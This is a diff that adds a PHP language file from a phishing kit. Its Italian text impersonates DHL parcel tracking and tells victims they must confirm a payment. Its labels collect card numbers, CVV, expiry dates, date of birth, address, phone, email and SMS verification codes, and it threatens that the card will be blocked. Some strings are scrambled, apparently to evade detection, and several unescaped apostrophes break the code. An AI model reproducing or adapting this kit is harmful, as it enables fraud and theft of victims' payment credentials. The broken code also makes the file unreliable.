@@ -1,0 +1,90 @@
+<?php
+/*==========================================================================
+* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
+* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
+* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
+===========================================================================*/
+function lang($phrase){
+	static $lang = array(
+		/* Main Page */
+		'Title'  => '| Benvenuto |', 										/* Title */
+		'Fo9001'  => 'Clrtner uiromer', 								/* Loading Header */
+		'Fo9002' => 'Bpzrntzz cpzevatiz', 								/* Loading P 1 */
+		'LdngP2' => 'Invia pacchi,', 									/* Loading P 2 */
+		'LdngP3' => 'Ricevi pacchetti', 									/* Loading P 3 */
+		'LdngP4' => 'Aiuto e contatto',  									/* Loading P 4 */
+		'LdngP5'	 => 'Tracciamento spedizioni DHL.',	  							/* DHL TRACKING */
+		'CntP'	 => 'Qui troverai informazioni sulle tue spedizioni.',	  								/* Control Panel */
+		'CusId'	 => 'Tieni traccia delle tue spedizioni di pacchi in qualsiasi momento dalla spedizione alla consegna',
+		'InpL1'	 => 'Spedizione DHL',										/* Label Input 1 */
+		'CusPs'	 => 'numero di identificazione 00340434139185930097 - ',		  									/* Customer Password */
+		'InpL2'	 => 'Stato: ',							/* Label Input 2 */
+		'Rmmbr'	 => 'nel consegnare',										/* Remember Me */
+		'Lbtn'	 => 'Messaggio importante!',											/* Login Btn */
+		'Span1'	 => 'Per completare la consegna il prima possibile, si prega di confermare il pagamento ',				/* Are you still ... */
+		'Span2'	 => ', facendo clic su Avanti. La conferma online deve essere effettuata entro i prossimi 14 giorni, prima della scadenza.',
+		'Ntke'	 => 'Seguente',									/* Btn next */
+		'AsdH2'	 => 'Pacchetto DHL',											/* Service */
+		'AsdS1'	 => 'Servizi DHL',										/* MailXchange */
+		'AsdS2'	 => 'DHL Express',						/* Detailed help and contact */
+		'AsdS3'	 => 'Logistica DHL',										/* Online FAQs */
+		'AsdS4'	 => 'Contatto',										/* GoToAssist */
+		'P1H1'	 => 'Aiuto e servizio clienti',								/* 1&1 MyWebsite*/
+		'P1Pr'	 => 'Ecco come funziona',											/* Here's how it works */
+		'P2H1'	 => 'App mobili',								/* Microsoft Office 365 */
+		'P2Pr'	 => 'Riguardo a noi',					/* Paragraphe 2 Paragraphe */
+		'P3H1'	 => 'Posta DHL',									/* 1&1 Domains */
+		'P3Pr'	 => 'Responsabilità',											/* Paragraphe 3 Paragraphe */
+		'PLink'	 => 'Presse',									/* More information */
+		'FtrS1'	 => 'carriera',							/* 1&1 Internet Ltd. • 2018 */
+		'FtrS2'	 => ' DHL International GmbH - Tutti i diritti riservati.',									/* Privacy Policy */
+		'Sfokh'	 => 'Abbiamo bisogno del tuo indirizzo per essere sicuri che persone non autorizzate non possano accedere ai tuoi pacchetti ',									/* We need your address to be sure */
+		'Ayam'	 => '10 giorni lavorativi',									/* 10 working days */
+		'Froth'	 => 'Dmll'miirov dtl umccv mllm frlrmlt DHL, dvuv emlt vimirv, rl umccv otiià itzereprev ml areetnet.',									/* From the arrival of your package */
+		'InptCC'	 => 'Nome del titolare della carta',									/* Cardholder's name */
+		'InptCCN'	 => 'Numero di carta di credito',									/* Credit card number */
+		'ExpMmAa'	 => 'Scadenza MM/AA',									/* Expir */
+		'NumCvC'	 => 'CVV (CVC)',									/* CVV */
+		'AddInf'	 => 'Indirizzo',									/* Address */
+		'CodPOs'	 => 'Cap',									/* Zip */
+		'MdiNa'	 => 'Città',									/* Zip */
+		'Zdiyad'	 => 'Data di nascita GG/MM/AAAA',									/* DOB */
+		'Farnon'	 => 'Numero di telefono',									/* Phone Number */
+		'Barid'	 => 'La tua email',									/* Your Email */
+		'PlzCon'	 => 'Conferma il seguente pagamento.',									/* Please confirm the following */
+		'Theun'	 => 'La password univoca è stata inviata al numero di cellulare elencato di seguito. Se devi modificare il tuo numero di cellulare, contatta la tua banca o modificalo tramite i canali disponibili (bancomat, web).',									/* Please confirm the following */
+		'March'	 => 'Mercante:',									/* Merchant */
+		'ExpDh'	 => 'DHL EXPRESS',									/* DHL EXPRESS */
+		'Ch7al'	 => 'Importo:',									/* Amount */
+		'Tarikh'	 => 'data:',									/* Date */
+		'TlNum'	 => 'Il tuo numero di telefono:',									/* Your Phone Number */
+		'SmCos'	 => 'codice SMS:',									/* Your SMS */
+		'PlzSm'	 => 'Inserisci il codice di verifica ricevuto da sms: ',				/* Please enter the */
+		'Subnn'	 => 'Invia',				/* Submit */
+		'AllCp'	 => 'DHL International GmbH - Tutti i diritti riservati.',				/* All Right */
+		'SmEnv'	 => 'Codice SMS inviato...',				/* SMS code sent... */
+		'SmWron'	 => 'SMS sbagliato o scaduto! Dopo (3) errori nell'inserimento del codice ricevuto via SMS, la transazione corrente viene annullata e la carta di credito bloccata.',				/* SMS is wrong */
+		'LastSm'	 => 'Avvertimento! Inserisci l'ultimo SMS ricevuto',				/* SMS is wrong */
+		'YouHav'	 => 'Hai attivato correttamente il processo di spedizione. Riceverai un'email da noi quando invieremo il pacco.'				/* SMS is wrong */
+		
+		
+		
+		
+	);	
+	return $lang[$phrase];
+}
+
+
+
+
+//		 | ' | = &apos;
+
+
+
+
+ ?>
+ 
+ 
+ 
+ 
+ 
